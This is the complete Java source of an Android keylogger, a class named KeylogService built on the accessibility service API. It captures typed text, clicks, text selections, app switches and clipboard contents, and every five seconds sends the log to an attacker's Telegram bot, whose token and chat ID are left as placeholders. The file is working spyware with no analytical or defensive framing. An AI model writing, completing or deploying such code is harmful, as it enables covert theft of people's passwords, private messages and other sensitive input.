// KeylogService.java
package com.hackerai.keylog;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeylogService extends AccessibilityService {

    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

    private StringBuilder buffer = new StringBuilder();
    private String lastPackage = "";
    private String lastClass = "";
    private long lastFlush = System.currentTimeMillis();
    private static final int FLUSH_INTERVAL_MS = 5000; // flush every 5s

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChanged(event, packageName, className);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleClick(event, packageName, className);
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                handleTextSelection(event, packageName, className);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowChange(event, packageName, className);
                break;
        }

        // Flush buffer periodically
        if (System.currentTimeMillis() - lastFlush > FLUSH_INTERVAL_MS) {
            flushBuffer("timer");
        }
    }

    private void handleTextChanged(AccessibilityEvent event, String pkg, String cls) {
        if (event.getText() != null && !event.getText().isEmpty()) {
            String text = event.getText().toString();
            if (text.length() > 0 && !text.equals(lastPackage)) {
                String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                buffer.append(String.format("[%s][TEXT][%s] %s\n", time, pkg, text));
                captureClipboard();
            }
        }
    }

    private void handleClick(AccessibilityEvent event, String pkg, String cls) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        String contentDesc = event.getContentDescription() != null ? event.getContentDescription().toString() : "";

        // Get text from source node
        String nodeText = "";
        if (event.getSource() != null) {
            nodeText = event.getSource().getText() != null ? event.getSource().getText().toString() : "";
        }

        buffer.append(String.format("[%s][CLICK][%s] desc='%s' text='%s'\n",
                time, pkg, contentDesc, nodeText));
    }

    private void handleTextSelection(AccessibilityEvent event, String pkg, String cls) {
        if (event.getText() != null && !event.getText().isEmpty()) {
            String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
            String text = event.getText().toString();
            int from = event.getFromIndex();
            int to = event.getToIndex();
            buffer.append(String.format("[%s][SELECT][%s] range=%d-%d text='%s'\n",
                    time, pkg, from, to, text));
        }
    }

    private void handleWindowChange(AccessibilityEvent event, String pkg, String cls) {
        if (!pkg.equals(lastPackage) || !cls.equals(lastClass)) {
            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
            buffer.append(String.format("\n[%s][APP] %s / %s\n", time, pkg, cls));
            lastPackage = pkg;
            lastClass = cls;
        }
    }

    private void captureClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    if (text != null && text.length() > 0) {
                        String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                        buffer.append(String.format("[%s][CLIPBOARD] %s\n", time, text));
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private void flushBuffer(String reason) {
        if (buffer.length() == 0) return;

        final String data = buffer.toString();
        buffer = new StringBuilder();
        lastFlush = System.currentTimeMillis();

        new Thread(() -> sendToTelegram(data)).start();
    }

    private void sendToTelegram(String message) {
        try {
            String encoded = URLEncoder.encode(message, "UTF-8");
            String urlStr = TELEGRAM_API + "?chat_id=" + CHAT_ID + "&text=" + encoded;

            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");

            int responseCode = conn.getResponseCode();
            if (responseCode != 200) {
                // fallback: send raw
            }
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {
        flushBuffer("interrupt");
    }

    @Override
    public void onDestroy() {
        flushBuffer("service_stop");
        super.onDestroy();
    }
}
